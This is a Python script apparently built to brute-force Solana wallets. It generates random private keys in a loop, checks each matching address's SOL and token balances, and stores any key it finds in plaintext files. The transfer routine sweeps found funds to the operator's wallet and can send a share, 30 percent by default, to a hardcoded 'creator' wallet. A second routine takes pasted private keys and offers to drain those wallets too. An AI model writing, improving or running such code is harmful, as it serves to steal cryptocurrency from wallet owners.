import time
import os
import json
import base58
import threading
from nacl.signing import SigningKey  # For Ed25519 key generation
from solana.rpc.api import Client
from solana.publickey import Pubkey
from solana.transaction import Transaction
from solana.system_program import TransferParams, transfer
from solana.keypair import Keypair
from solana.exceptions import SolanaRpcException
from functools import wraps

# --- Helper functions and classes ---

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# RPCRequest helper class (must be defined before use)
class RPCRequest:
    def __init__(self, body):
        self.body = body
    def to_json(self):
        return json.dumps(self.body)

# SimpleParser that parses a JSON string into a dict
class SimpleParser:
    @staticmethod
    def from_json(raw):
        return json.loads(raw)

# A simple mapping of known token mint addresses to token names.
TOKEN_NAMES = {
    "So11111111111111111111111111111111111111112": "Wrapped SOL",
    "Es9vMFrzaCERj7M3Cug4CX7i2B8ZnQfLwKrtwVPzk6Y": "USDT",
    "EPjFWdd5AufqSSqeM2qP6MJCV9i9eW5oUn1v3MNVpq7": "USDC",
    "7XSQZbn1gZw1jjw3ZsY5Rkz66b9c7qKEy6qGJKYj1zUo": "Jito SOL",  # example mint for Jito SOL
    # Add more mappings as needed...
}

# New helper function to log command output
def log_command_output(text):
    with open(COMMAND_OUTPUT_FILE, "a") as f:
        f.write(text + "\n" + "-" * 40 + "\n")

# --- Load configuration ---
with open("config.json", "r") as config_file:
    config = json.load(config_file)

YOUR_WALLET = config["YOUR_WALLET"]
REQUEST_DELAY = config["REQUEST_DELAY"]
RPC_RETRIES = config.get("RPC_RETRIES", 3)
RPC_RETRY_DELAY = config.get("RPC_RETRY_DELAY", 2)
CHECK_TOKENS = config.get("CHECK_TOKENS", False)
DONATE = config.get("DONATE", False)
DONATION_PERCENTAGE = config.get("DONATION_PERCENTAGE", 30)  # e.g., 30 means 30%
INPUT_DISPLAY_DELAY = config.get("INPUT_DISPLAY_DELAY", 10)   # seconds to display input results

# Donation wallet (creator's wallet)
DONATION_WALLET = "5oGcPFDdgYptfAPckr5yYcfG5f83CCfXah8bVQNAjjo9"

# --- Setup RPC client ---
SOLANA_RPC = config["RPC_SERVER"]
client = Client(SOLANA_RPC)

# Files to log wallet details and outputs.
# found_wallets.txt stores auto-generated wallets.
# potential.txt stores wallets that already had transactions.
# output_command.txt logs results from user-input wallet checks.
WALLET_LOG_FILE = "found_wallets.txt"
POTENTIAL_WALLET_FILE = "potential.txt"  # Change to "potentiasl.txt" if desired.
COMMAND_OUTPUT_FILE = "output_command.txt"

# Flag to pause/resume the main loop.
pause_generation = False

# --- Utility functions ---
def wait_for_rpc():
    """Wait until the RPC endpoint is healthy before resuming generation."""
    print("RPC error encountered. Pausing generation until RPC node is healthy...")
    while True:
        try:
            health = client.get_health()
            if health and health.get("result") == "ok":
                print("RPC node is healthy. Resuming generation...")
                break
        except Exception:
            print("Waiting for RPC node to recover...")
        time.sleep(5)

def with_rpc_retry(func):
    """Decorator to retry RPC calls if a SolanaRpcException occurs."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        for attempt in range(RPC_RETRIES):
            try:
                return func(*args, **kwargs)
            except SolanaRpcException as e:
                print(f"RPC error on attempt {attempt+1}/{RPC_RETRIES} in {func.__name__}: {e}")
                time.sleep(RPC_RETRY_DELAY)
        wait_for_rpc()
        return func(*args, **kwargs)
    return wrapper

def generate_ed25519_keypair():
    """Generate a random Ed25519 keypair and return the private key as Base58."""
    seed = os.urandom(32)
    signing_key = SigningKey(seed)
    private_key = signing_key._signing_key
    return base58.b58encode(private_key).decode('utf-8')

def base58_to_ed25519_keypair(private_key_base58):
    """Convert a Base58-encoded Ed25519 private key to a Keypair.
       Returns None if invalid."""
    try:
        private_key_bytes = base58.b58decode(private_key_base58)
        if len(private_key_bytes) != 64:
            raise ValueError("Invalid Ed25519 private key length. Expected 64 bytes.")
        return Keypair.from_secret_key(private_key_bytes)
    except Exception as e:
        print(f"Error decoding private key: {e}")
        return None

def private_key_to_wallet(private_key):
    """Convert a private key string to a wallet address and Keypair."""
    keypair = base58_to_ed25519_keypair(private_key)
    if keypair is None:
        return None, None
    return str(keypair.public_key), keypair

@with_rpc_retry
def check_wallet_balance(wallet_address):
    """Check the balance of a Solana wallet in SOL."""
    pubkey = Pubkey.from_string(wallet_address)
    balance_response = client.get_balance(pubkey)
    balance_lamports = balance_response.value if balance_response else 0
    return balance_lamports / 1_000_000_000

@with_rpc_retry
def check_wallet_transactions(wallet_address):
    """Check if the wallet has any transactions."""
    pubkey = Pubkey.from_string(wallet_address)
    transactions_response = client.get_signatures_for_address(pubkey)
    return bool(transactions_response.value)

@with_rpc_retry
def send_sol(sender_keypair, recipient_wallet, amount_sol):
    """Send SOL from one wallet to another."""
    amount_lamports = int(amount_sol * 1_000_000_000)
    txn = Transaction().add(transfer(TransferParams(
        from_pubkey=sender_keypair.public_key,
        to_pubkey=Pubkey.from_string(recipient_wallet),
        lamports=amount_lamports
    )))
    client.send_transaction(txn, sender_keypair)
    print(f"Sent {amount_sol} SOL to {recipient_wallet}.")
    return True

@with_rpc_retry
def get_token_balances(wallet_address):
    """
    Retrieve all SPL token balances for the given wallet using jsonParsed encoding.
    Builds the request body, wraps it in RPCRequest, and uses SimpleParser to parse the response.
    Also looks up token names using TOKEN_NAMES.
    """
    pubkey = Pubkey.from_string(wallet_address)
    body = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getTokenAccountsByOwner",
        "params": [
            str(pubkey),
            {"programId": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"},
            {"encoding": "jsonParsed"}
        ]
    }
    req = RPCRequest(body)
    response = client._provider.make_request(req, SimpleParser)
    tokens = []
    if response.get("result") and response["result"].get("value"):
        for account in response["result"]["value"]:
            info = account["account"]["data"]["parsed"]["info"]
            mint = info.get("mint")
            token_amount = info.get("tokenAmount", {}).get("uiAmount")
            token_name = TOKEN_NAMES.get(mint, "Unknown")
            tokens.append({"mint": mint, "name": token_name, "amount": token_amount})
    return tokens

def log_wallet_details(private_key, wallet_address, balance_sol, token_balances=None, has_transactions=False):
    """Log wallet details to found_wallets.txt and, if the wallet had previous transactions, to potential.txt."""
    details = (
        f"Private Key: {private_key}\n"
        f"Wallet Address: {wallet_address}\n"
        f"Balance: {balance_sol} SOL\n"
    )
    if token_balances is not None:
        details += "Token Balances:\n"
        for token in token_balances:
            details += f"  Mint: {token['mint']}, Name: {token['name']}, Amount: {token['amount']}\n"
    details += "-" * 40 + "\n"
    
    with open(WALLET_LOG_FILE, "a") as f:
        f.write(details)
    
    if has_transactions:
        with open(POTENTIAL_WALLET_FILE, "a") as f:
            f.write(details)

def process_funds(keypair, balance_sol):
    """
    Process sending funds from a wallet.
    If donation is enabled, donate a percentage to the creator's wallet,
    then send the remaining balance to YOUR_WALLET.
    """
    if DONATE:
        donation_amount = balance_sol * (DONATION_PERCENTAGE / 100)
        remaining_amount = balance_sol - donation_amount
        if donation_amount > 0:
            if send_sol(keypair, DONATION_WALLET, donation_amount):
                print(f"Donated {donation_amount} SOL to creator.")
        if remaining_amount > 0:
            if send_sol(keypair, YOUR_WALLET, remaining_amount):
                print(f"Transferred {remaining_amount} SOL to your wallet.")
    else:
        if send_sol(keypair, YOUR_WALLET, balance_sol):
            print(f"Transferred {balance_sol} SOL to your wallet.")

# --- Input handling thread ---
def input_thread():
    """
    Thread to handle user input.
    Pauses auto-generation and displays wallet details for INPUT_DISPLAY_DELAY seconds.
    Accepts both private and public keys.
    If the searched wallet had previous transactions, logs it in the potential file.
    """
    global pause_generation
    while True:
        user_input = input().strip()
        if user_input.lower() == "exit":
            os._exit(0)
        pause_generation = True
        clear_console()
        # Try as a private key first.
        keypair = base58_to_ed25519_keypair(user_input)
        is_private = keypair is not None
        if is_private:
            wallet_address, _ = private_key_to_wallet(user_input)
            used_key = user_input
        else:
            try:
                pubkey = Pubkey.from_string(user_input)
                wallet_address = str(pubkey)
                print("Public key accepted.")
                used_key = "N/A"
            except Exception:
                print("Input is neither a valid private key nor a valid public key. Please try again.")
                pause_generation = False
                continue

        try:
            balance_sol = check_wallet_balance(wallet_address)
            tokens = get_token_balances(wallet_address) if CHECK_TOKENS else None
            has_transactions = check_wallet_transactions(wallet_address)
            output = f"Wallet Address: {wallet_address}\nBalance: {balance_sol} SOL\n"
            if CHECK_TOKENS:
                if tokens:
                    output += "Token Balances:\n"
                    for token in tokens:
                        output += f"  Mint: {token['mint']}, Name: {token['name']}, Amount: {token['amount']}\n"
                else:
                    output += "No SPL tokens found.\n"
            if has_transactions:
                output += "This wallet has previous transactions.\n"
                # Log to potential file as well.
                log_wallet_details(used_key, wallet_address, balance_sol, token_balances=tokens, has_transactions=True)
            else:
                log_command_output(output)
            print(output)
        except Exception as e:
            print("Error checking wallet:", e)
            pause_generation = False
            continue

        if is_private and balance_sol > 0:
            answer = input("This wallet has funds. Do you want to transfer them to your wallet? (Y/N): ").strip().lower()
            if answer == "y":
                process_funds(keypair, balance_sol)
        else:
            if not is_private:
                print("Public key detected; cannot initiate transfer without a private key.")
            else:
                print("No funds to transfer.")
        time.sleep(INPUT_DISPLAY_DELAY)
        pause_generation = False

# --- Main automatic generation loop ---
def main():
    threading.Thread(target=input_thread, daemon=True).start()
    try:
        while True:
            if pause_generation:
                time.sleep(1)
                continue
            clear_console()
            private_key_base58 = generate_ed25519_keypair()
            print(f"Generated Private Key: {private_key_base58}")
            
            wallet_address, keypair = private_key_to_wallet(private_key_base58)
            if not keypair:
                print("Invalid private key generated. Skipping...")
                continue

            balance_sol = check_wallet_balance(wallet_address)
            has_transactions = check_wallet_transactions(wallet_address)
            
            tokens = None
            if CHECK_TOKENS:
                tokens = get_token_balances(wallet_address)
                if tokens:
                    print("Token Balances:")
                    for token in tokens:
                        print(f"  Mint: {token['mint']}, Name: {token['name']}, Amount: {token['amount']}")
                else:
                    print("No SPL tokens found for this wallet.")

            if balance_sol > 0:
                print(f"Found wallet with balance: {wallet_address} (Balance: {balance_sol} SOL)")
                log_wallet_details(private_key_base58, wallet_address, balance_sol, token_balances=tokens, has_transactions=has_transactions)
                process_funds(keypair, balance_sol)
            else:
                print(f"Wallet {wallet_address} is empty.")
            time.sleep(REQUEST_DELAY)
    except KeyboardInterrupt:
        print("\nScript stopped by user. Exiting gracefully...")

if __name__ == "__main__":
    main()
